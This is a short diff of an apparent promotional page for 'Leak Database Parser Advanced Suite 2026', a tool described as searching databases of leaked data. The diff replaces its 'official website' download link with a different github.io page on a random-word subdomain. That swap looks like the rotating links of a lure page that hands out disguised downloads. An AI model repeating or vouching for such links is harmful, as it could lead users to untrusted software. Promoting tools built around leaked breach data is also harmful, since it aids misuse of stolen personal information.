@@ -47,6 +47,6 @@ A5: The databases are updated regularly, often daily, to include the latest leak
 
 To experience the full capabilities of Leak Database Parser Advanced Suite 2026, download the latest version from the official website:
 
-[Download from official website](https://yellowtaxisave.github.io/download-page/)
+[Download from official website](https://capitals-707-bringing.github.io/download-page/)
 
 This version includes all the latest updates and security patches to ensure optimal performance and reliability for your data analysis needs.
